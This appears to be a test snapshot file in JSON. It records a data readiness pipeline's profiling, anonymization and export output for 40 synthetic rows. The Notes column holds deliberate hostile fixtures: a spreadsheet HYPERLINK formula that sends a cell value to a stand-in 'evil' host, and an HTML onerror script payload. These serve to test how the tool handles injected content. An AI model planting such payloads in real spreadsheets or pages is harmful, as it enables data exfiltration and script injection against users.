@@ -1,0 +1,1843 @@
+{
+ "analyze_stages": [
+  "columns",
+  "done",
+  "finalizing",
+  "loading",
+  "overview"
+ ],
+ "confirm": {
+  "message": "Key selection saved",
+  "selected_key": [
+   "ID"
+  ],
+  "success": true
+ },
+ "execute_final": {
+  "message": "Pipeline execution complete",
+  "percentage": 100,
+  "stage": "done",
+  "transformation_log": [
+   {
+    "columns": [
+     "Name"
+    ],
+    "note": "Values replaced with consistent placeholders (e.g. NAM_00001); the same value always gets the same placeholder",
+    "rows_affected": 40,
+    "status": "applied",
+    "type": "anonymization"
+   },
+   {
+    "columns": [
+     "EuroNum"
+    ],
+    "note": "Type conversion was not performed on the data; use the Data Normalizer tool",
+    "status": "recorded, not applied",
+    "type": "normalization"
+   }
+  ]
+ },
+ "execute_output": {
+  "data_readiness_report_<TS>_data.xlsx": {
+   "Sheet1": [
+    [
+     "s:'ID'",
+     "s:'Zip'",
+     "s:'Account'",
+     "s:'BigId'",
+     "s:'Amount'",
+     "s:'Region'",
+     "s:'Date'",
+     "s:'DateText'",
+     "s:'EuroNum'",
+     "s:'Pct'",
+     "s:'Flag'",
+     "s:'Name'",
+     "s:'Email'",
+     "s:'Notes'"
+    ],
+    [
+     "s:'PR-00001'",
+     "s:'01000'",
+     "s:'1000'",
+     "s:'9007199254740993'",
+     "s:'-300.0'",
+     "s:'N'",
+     "s:'2024-01-01'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice0@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00002'",
+     "s:'01007'",
+     "s:'1001'",
+     "s:'9007199254740994'",
+     "s:'-262.5'",
+     "s:'S'",
+     "s:'2024-01-02'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "n:None",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00003'",
+     "s:'01014'",
+     "s:'1002'",
+     "s:'9007199254740995'",
+     "s:'-225.0'",
+     "n:None",
+     "s:'2024-01-03'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol2@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00004'",
+     "s:'01021'",
+     "s:'1003'",
+     "s:'9007199254740996'",
+     "s:'-187.5'",
+     "s:'N'",
+     "s:'2024-01-04'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave3@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00005'",
+     "s:'01028'",
+     "n:None",
+     "s:'9007199254740997'",
+     "s:'-150.0'",
+     "s:'S'",
+     "s:'2024-01-05'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice4@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00006'",
+     "s:'01035'",
+     "s:'1005'",
+     "s:'9007199254740998'",
+     "s:'-112.5'",
+     "n:None",
+     "s:'2024-01-06'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob5@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00007'",
+     "s:'01042'",
+     "s:'1006'",
+     "s:'9007199254740999'",
+     "s:'-75.0'",
+     "s:'N'",
+     "s:'2024-01-07'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol6@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00007'",
+     "s:'01042'",
+     "s:'1006'",
+     "s:'9007199254740999'",
+     "s:'-75.0'",
+     "s:'N'",
+     "s:'2024-01-07'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol6@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00009'",
+     "s:'01056'",
+     "s:'1008'",
+     "s:'9007199254741001'",
+     "s:'0.0'",
+     "n:None",
+     "s:'2024-01-09'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice8@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00010'",
+     "s:'01063'",
+     "s:'1009'",
+     "s:'9007199254741002'",
+     "s:'37.5'",
+     "s:'N'",
+     "s:'2024-01-10'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob9@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00011'",
+     "s:'01070'",
+     "s:'1010'",
+     "s:'9007199254741003'",
+     "n:None",
+     "s:'S'",
+     "s:'2024-01-11'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol10@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00012'",
+     "s:'01077'",
+     "s:'1011'",
+     "s:'9007199254741004'",
+     "s:'112.5'",
+     "n:None",
+     "s:'2024-01-12'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave11@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00013'",
+     "s:'01084'",
+     "s:'1012'",
+     "s:'9007199254741005'",
+     "s:'150.0'",
+     "s:'N'",
+     "s:'2024-01-13'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice12@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00014'",
+     "s:'01091'",
+     "s:'1013'",
+     "s:'9007199254741006'",
+     "s:'187.5'",
+     "s:'S'",
+     "s:'2024-01-14'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob13@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00015'",
+     "s:'01098'",
+     "s:'1014'",
+     "s:'9007199254741007'",
+     "s:'225.0'",
+     "n:None",
+     "s:'2024-01-15'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol14@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00016'",
+     "s:'01105'",
+     "s:'1015'",
+     "s:'9007199254741008'",
+     "s:'262.5'",
+     "s:'N'",
+     "s:'2024-01-16'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave15@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00017'",
+     "s:'01112'",
+     "s:'1016'",
+     "s:'9007199254741009'",
+     "s:'300.0'",
+     "s:'S'",
+     "s:'2024-01-17'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice16@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00018'",
+     "s:'01119'",
+     "s:'1017'",
+     "s:'9007199254741010'",
+     "s:'337.5'",
+     "n:None",
+     "s:'2024-01-18'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob17@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00019'",
+     "s:'01126'",
+     "s:'1018'",
+     "s:'9007199254741011'",
+     "s:'375.0'",
+     "s:'N'",
+     "s:'2024-01-19'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol18@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00020'",
+     "s:'01133'",
+     "s:'1019'",
+     "s:'9007199254741012'",
+     "s:'412.5'",
+     "s:'S'",
+     "s:'2024-01-20'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave19@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00021'",
+     "s:'01140'",
+     "s:'1020'",
+     "s:'9007199254741013'",
+     "s:'450.0'",
+     "n:None",
+     "s:'2024-01-21'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice20@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00022'",
+     "s:'01147'",
+     "s:'1021'",
+     "s:'9007199254741014'",
+     "s:'487.5'",
+     "s:'N'",
+     "s:'2024-01-22'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob21@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00023'",
+     "s:'01154'",
+     "s:'1022'",
+     "s:'9007199254741015'",
+     "s:'525.0'",
+     "s:'S'",
+     "s:'2024-01-23'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol22@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00024'",
+     "s:'01161'",
+     "s:'1023'",
+     "s:'9007199254741016'",
+     "s:'562.5'",
+     "n:None",
+     "s:'2024-01-24'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave23@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00025'",
+     "s:'01168'",
+     "s:'1024'",
+     "s:'9007199254741017'",
+     "s:'600.0'",
+     "s:'N'",
+     "s:'2024-01-25'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice24@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00026'",
+     "s:'01175'",
+     "s:'1025'",
+     "s:'9007199254741018'",
+     "s:'637.5'",
+     "s:'S'",
+     "s:'2024-01-26'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob25@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00027'",
+     "s:'01182'",
+     "s:'1026'",
+     "s:'9007199254741019'",
+     "s:'675.0'",
+     "n:None",
+     "s:'2024-01-27'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol26@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00028'",
+     "s:'01189'",
+     "s:'1027'",
+     "s:'9007199254741020'",
+     "s:'712.5'",
+     "s:'N'",
+     "s:'2024-01-28'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave27@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00029'",
+     "s:'01196'",
+     "s:'1028'",
+     "s:'9007199254741021'",
+     "s:'750.0'",
+     "s:'S'",
+     "s:'2024-01-29'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice28@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00030'",
+     "s:'01203'",
+     "s:'1029'",
+     "s:'9007199254741022'",
+     "s:'787.5'",
+     "n:None",
+     "s:'2024-01-30'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob29@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00031'",
+     "s:'01210'",
+     "s:'1030'",
+     "s:'9007199254741023'",
+     "s:'825.0'",
+     "s:'N'",
+     "s:'2024-01-31'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol30@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00032'",
+     "s:'01217'",
+     "s:'1031'",
+     "s:'9007199254741024'",
+     "s:'862.5'",
+     "s:'S'",
+     "s:'2024-02-01'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave31@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00033'",
+     "s:'01224'",
+     "s:'1032'",
+     "s:'9007199254741025'",
+     "s:'900.0'",
+     "n:None",
+     "s:'2024-02-02'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice32@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00034'",
+     "s:'01231'",
+     "s:'1033'",
+     "s:'9007199254741026'",
+     "s:'937.5'",
+     "s:'N'",
+     "s:'2024-02-03'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob33@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00035'",
+     "s:'01238'",
+     "s:'1034'",
+     "s:'9007199254741027'",
+     "s:'975.0'",
+     "s:'S'",
+     "s:'2024-02-04'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol34@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00036'",
+     "s:'01245'",
+     "s:'1035'",
+     "s:'9007199254741028'",
+     "s:'1012.5'",
+     "n:None",
+     "s:'2024-02-05'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave35@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00037'",
+     "s:'01252'",
+     "s:'1036'",
+     "s:'9007199254741029'",
+     "s:'1050.0'",
+     "s:'N'",
+     "s:'2024-02-06'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'True'",
+     "s:'NAM_00001'",
+     "s:'alice36@example.com'",
+     "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00038'",
+     "s:'01259'",
+     "s:'1037'",
+     "s:'9007199254741030'",
+     "s:'1087.5'",
+     "s:'S'",
+     "s:'2024-02-07'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'False'",
+     "s:'NAM_00002'",
+     "s:'bob37@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00039'",
+     "s:'01266'",
+     "s:'1038'",
+     "s:'9007199254741031'",
+     "s:'1125.0'",
+     "n:None",
+     "s:'2024-02-08'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'True'",
+     "s:'NAM_00003'",
+     "s:'carol38@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00040'",
+     "s:'01273'",
+     "s:'1039'",
+     "s:'9007199254741032'",
+     "s:'1162.5'",
+     "s:'N'",
+     "s:'2024-02-09'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'False'",
+     "s:'NAM_00004'",
+     "s:'dave39@example.com'",
+     "s:'café'"
+    ]
+   ],
+   "_DataDragon_Log": [
+    [
+     "s:'Item'",
+     "s:'Value'"
+    ],
+    [
+     "s:'Tool'",
+     "s:'Data Readiness Pipeline'"
+    ],
+    [
+     "s:'Version'",
+     "s:'<VERSION>'"
+    ],
+    [
+     "s:'Timestamp (UTC)'",
+     "s:'<TIMESTAMP>'"
+    ],
+    [
+     "s:'Rows in'",
+     "s:'40'"
+    ],
+    [
+     "s:'Rows out'",
+     "s:'40'"
+    ],
+    [
+     "s:'Parameters'",
+     "s:'{\"transformations\": [{\"columns\": [\"Name\"], \"note\": \"Values replaced with consistent placeholders (e.g. NAM_00001); the same value always gets the same placeholder\", \"rows_affected\": 40, \"status\": \"applied\", \"type\": \"anonymization\"}, {\"columns\": [\"EuroNum\"], \"note\": \"Type conversion was not performed on the data; use the Data Normalizer tool\", \"status\": \"recorded, not applied\", \"type\": \"normalization\"}]}'"
+    ],
+    [
+     "s:'Warnings'",
+     "s:''"
+    ]
+   ]
+  },
+  "data_readiness_report_<TS>_report.pdf": {
+   "binary_bytes_present": true
+  }
+ },
+ "gaps": {
+  "columns_with_gaps": 4,
+  "current_triage": {},
+  "gap_summary": [
+   {
+    "column": "Region",
+    "detected_type": "Text",
+    "null_count": 13,
+    "null_percentage": 32.5,
+    "unique_count": 2
+   },
+   {
+    "column": "Account",
+    "detected_type": "Float",
+    "null_count": 1,
+    "null_percentage": 2.5,
+    "unique_count": 38
+   },
+   {
+    "column": "Amount",
+    "detected_type": "Float",
+    "null_count": 1,
+    "null_percentage": 2.5,
+    "unique_count": 38
+   },
+   {
+    "column": "Email",
+    "detected_type": "Email",
+    "null_count": 1,
+    "null_percentage": 2.5,
+    "unique_count": 38
+   }
+  ],
+  "success": true,
+  "total_columns": 14
+ },
+ "gaps_status": 200,
+ "keys_final": {
+  "current": 0,
+  "message": "Search complete. Found 2 minimal key(s).",
+  "percentage": 92,
+  "stage": "complete",
+  "total": 0
+ },
+ "keys_stages": [
+  "complete",
+  "done",
+  "filtering",
+  "level1",
+  "loading"
+ ],
+ "select": {
+  "message": "Transformation selections saved",
+  "selections": {
+   "anonymization": {
+    "columns": [
+     "Name"
+    ],
+    "enabled": true
+   },
+   "normalization": {
+    "columns": [
+     "EuroNum"
+    ],
+    "enabled": true
+   }
+  },
+  "success": true
+ },
+ "start": {
+  "column_names": [
+   "ID",
+   "Zip",
+   "Account",
+   "BigId",
+   "Amount",
+   "Region",
+   "Date",
+   "DateText",
+   "EuroNum",
+   "Pct",
+   "Flag",
+   "Name",
+   "Email",
+   "Notes"
+  ],
+  "columns": 14,
+  "rows": 40,
+  "success": true
+ },
+ "state_after_analyze": {
+  "analysis": {
+   "columns": {
+    "Account": {
+     "detected_type": "Float",
+     "dtype": "float64",
+     "format_info": null,
+     "is_numeric": true,
+     "memory_bytes": 320,
+     "non_null_count": 39,
+     "null_count": 1,
+     "null_percentage": 2.5,
+     "outliers": {
+      "count": 0,
+      "percentage": 0.0
+     },
+     "statistics": {
+      "kurtosis": -1.159806,
+      "max": 1039.0,
+      "mean": 1019.871795,
+      "median": 1020.0,
+      "min": 1000.0,
+      "q25": 1010.5,
+      "q50": 1020.0,
+      "q75": 1029.5,
+      "skew": -0.044205,
+      "std": 11.596686
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "1000.0",
+      "1001.0",
+      "1002.0"
+     ],
+     "unique_count": 38
+    },
+    "Amount": {
+     "detected_type": "Float",
+     "dtype": "float64",
+     "format_info": null,
+     "is_numeric": true,
+     "memory_bytes": 320,
+     "non_null_count": 39,
+     "null_count": 1,
+     "null_percentage": 2.5,
+     "outliers": {
+      "count": 0,
+      "percentage": 0.0
+     },
+     "statistics": {
+      "kurtosis": -1.197674,
+      "max": 1162.5,
+      "mean": 439.423077,
+      "median": 450.0,
+      "min": -300.0,
+      "q25": 75.0,
+      "q50": 450.0,
+      "q75": 806.25,
+      "skew": -0.052607,
+      "std": 441.360211
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "-300.0",
+      "-262.5",
+      "-225.0"
+     ],
+     "unique_count": 38
+    },
+    "BigId": {
+     "detected_type": "Integer",
+     "dtype": "int64",
+     "format_info": null,
+     "is_numeric": true,
+     "memory_bytes": 320,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "outliers": {
+      "count": 0,
+      "percentage": 0.0
+     },
+     "statistics": {
+      "kurtosis": -1.165607,
+      "max": 9007199254741032.0,
+      "mean": 9007199254741012.0,
+      "median": 9007199254741012.0,
+      "min": 9007199254740992.0,
+      "q25": 9007199254741004.0,
+      "q50": 9007199254741012.0,
+      "q75": 9007199254741022.0,
+      "skew": 0.132528,
+      "std": 11.766968
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "9007199254740993",
+      "9007199254740994",
+      "9007199254740995"
+     ],
+     "unique_count": 39
+    },
+    "Date": {
+     "date_range": {
+      "max": "2024-02-09 00:00:00",
+      "min": "2024-01-01 00:00:00"
+     },
+     "detected_type": "Date",
+     "dtype": "object",
+     "format_info": "Format: %Y-%m-%d",
+     "is_categorical": true,
+     "is_datetime": true,
+     "is_numeric": false,
+     "memory_bytes": 2360,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 10,
+      "mean_length": 10.0,
+      "median_length": 10.0,
+      "min_length": 10
+     },
+     "top_values": {
+      "2024-01-01": 1,
+      "2024-01-07": 2,
+      "2024-01-24": 1,
+      "2024-01-25": 1,
+      "2024-01-26": 1,
+      "2024-01-27": 1,
+      "2024-01-28": 1,
+      "2024-01-29": 1,
+      "2024-01-30": 1,
+      "2024-01-31": 1
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "2024-01-01",
+      "2024-01-02",
+      "2024-01-03"
+     ],
+     "unique_count": 39
+    },
+    "DateText": {
+     "date_range": {
+      "max": "2024-01-02 00:00:00",
+      "min": "2024-01-02 00:00:00"
+     },
+     "detected_type": "Date",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_datetime": true,
+     "is_numeric": false,
+     "memory_bytes": 2360,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 10,
+      "mean_length": 10.0,
+      "median_length": 10.0,
+      "min_length": 10
+     },
+     "top_values": {
+      "01/02/2024": 15,
+      "13/02/2024": 13,
+      "2024-03-05": 12
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "01/02/2024",
+      "2024-03-05",
+      "13/02/2024"
+     ],
+     "unique_count": 3
+    },
+    "Email": {
+     "detected_type": "Email",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 2648,
+     "non_null_count": 39,
+     "null_count": 1,
+     "null_percentage": 2.5,
+     "string_stats": {
+      "max_length": 19,
+      "mean_length": 18.076923,
+      "median_length": 18.0,
+      "min_length": 16
+     },
+     "top_values": {
+      "alice0@example.com": 1,
+      "alice24@example.com": 1,
+      "alice28@example.com": 1,
+      "bob25@example.com": 1,
+      "bob29@example.com": 1,
+      "carol26@example.com": 1,
+      "carol30@example.com": 1,
+      "carol6@example.com": 2,
+      "dave27@example.com": 1,
+      "dave31@example.com": 1
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "alice0@example.com",
+      "carol2@example.com",
+      "dave3@example.com"
+     ],
+     "unique_count": 38
+    },
+    "EuroNum": {
+     "detected_type": "Text",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 2127,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 8,
+      "mean_length": 4.175,
+      "median_length": 3.0,
+      "min_length": 2
+     },
+     "top_values": {
+      "1.234,56": 12,
+      "10": 13,
+      "2,5": 15
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "2,5",
+      "1.234,56",
+      "10"
+     ],
+     "unique_count": 3
+    },
+    "Flag": {
+     "detected_type": "Boolean",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 2139,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 5,
+      "mean_length": 4.475,
+      "median_length": 4.0,
+      "min_length": 4
+     },
+     "top_values": {
+      "False": 19,
+      "True": 21
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "True",
+      "False",
+      "True"
+     ],
+     "unique_count": 2
+    },
+    "ID": {
+     "detected_type": "ID/Serial",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 2280,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 8,
+      "mean_length": 8.0,
+      "median_length": 8.0,
+      "min_length": 8
+     },
+     "top_values": {
+      "PR-00001": 1,
+      "PR-00007": 2,
+      "PR-00024": 1,
+      "PR-00025": 1,
+      "PR-00026": 1,
+      "PR-00027": 1,
+      "PR-00028": 1,
+      "PR-00029": 1,
+      "PR-00030": 1,
+      "PR-00031": 1
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "PR-00001",
+      "PR-00002",
+      "PR-00003"
+     ],
+     "unique_count": 39
+    },
+    "Name": {
+     "detected_type": "Text",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 2131,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 5,
+      "mean_length": 4.275,
+      "median_length": 5.0,
+      "min_length": 3
+     },
+     "top_values": {
+      "Alice": 10,
+      "Bob": 10,
+      "Carol": 11,
+      "Dave": 9
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "Alice",
+      "Bob",
+      "Carol"
+     ],
+     "unique_count": 4
+    },
+    "Notes": {
+     "detected_type": "Text",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 2892,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 34,
+      "mean_length": 18.35,
+      "median_length": 28.0,
+      "min_length": 4
+     },
+     "top_values": {
+      "<img src=x onerror=alert(1)>": 11,
+      "=HYPERLINK(\"http://evil/?\"&A2,\"x\")": 10,
+      "café": 9,
+      "x|||y": 10
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+      "x|||y",
+      "<img src=x onerror=alert(1)>"
+     ],
+     "unique_count": 4
+    },
+    "Pct": {
+     "detected_type": "Percentage",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 2106,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "string_stats": {
+      "max_length": 5,
+      "mean_length": 3.65,
+      "median_length": 3.0,
+      "min_length": 3
+     },
+     "top_values": {
+      "0.5": 12,
+      "12.5%": 13,
+      "50%": 15
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "50%",
+      "0.5",
+      "12.5%"
+     ],
+     "unique_count": 3
+    },
+    "Region": {
+     "detected_type": "Text",
+     "dtype": "object",
+     "format_info": null,
+     "is_categorical": true,
+     "is_numeric": false,
+     "memory_bytes": 1766,
+     "non_null_count": 27,
+     "null_count": 13,
+     "null_percentage": 32.5,
+     "string_stats": {
+      "max_length": 1,
+      "mean_length": 1.0,
+      "median_length": 1.0,
+      "min_length": 1
+     },
+     "top_values": {
+      "N": 15,
+      "S": 12
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "N",
+      "S",
+      "N"
+     ],
+     "unique_count": 2
+    },
+    "Zip": {
+     "detected_type": "Integer",
+     "dtype": "int64",
+     "format_info": null,
+     "is_numeric": true,
+     "memory_bytes": 320,
+     "non_null_count": 40,
+     "null_count": 0,
+     "null_percentage": 0.0,
+     "outliers": {
+      "count": 0,
+      "percentage": 0.0
+     },
+     "statistics": {
+      "kurtosis": -1.205883,
+      "max": 1273.0,
+      "mean": 1136.325,
+      "median": 1136.5,
+      "min": 1000.0,
+      "q25": 1068.25,
+      "q50": 1136.5,
+      "q75": 1204.75,
+      "skew": -0.00177,
+      "std": 82.032322
+     },
+     "type_confidence": 100.0,
+     "type_samples": [
+      "1000",
+      "1007",
+      "1014"
+     ],
+     "unique_count": 39
+    }
+   },
+   "gap_summary": [
+    {
+     "column": "Region",
+     "detected_type": "Text",
+     "null_count": 13,
+     "null_percentage": 32.5,
+     "unique_count": 2
+    },
+    {
+     "column": "Account",
+     "detected_type": "Float",
+     "null_count": 1,
+     "null_percentage": 2.5,
